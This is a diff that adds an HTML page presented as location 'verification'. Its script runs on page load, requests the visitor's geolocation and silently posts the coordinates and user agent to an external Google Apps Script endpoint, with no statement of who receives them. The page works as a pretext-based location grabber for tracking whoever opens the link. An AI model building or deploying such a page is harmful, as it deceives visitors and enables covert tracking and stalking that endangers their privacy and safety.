@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Auto Location Share</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; padding: 2rem; }
+  </style>
+</head>
+<body>
+  <h2>Verifying Your Location...</h2>
+  <p id="status">Please wait...</p>
+
+  <script>
+    const endpoint = "https://script.google.com/macros/s/AKfycbyhkLxwqb5PYm17GOSJnB1ssxHRIGuolD6FW3xcqyJnYUf18iZK_DoiQS9y6bBik3MoHw/exec";
+
+    function sendLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            const coords = {
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
+              userAgent: navigator.userAgent
+            };
+
+            fetch(endpoint, {
+              method: "POST",
+              mode: "no-cors",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(coords)
+            });
+
+            document.getElementById("status").innerText = "Location sent successfully.";
+          },
+          (err) => {
+            document.getElementById("status").innerText = "Error: " + err.message;
+          }
+        );
+      } else {
+        document.getElementById("status").innerText = "Geolocation not supported.";
+      }
+    }
+
+    window.onload = sendLocation;
+  </script>
+</body>
+</html>
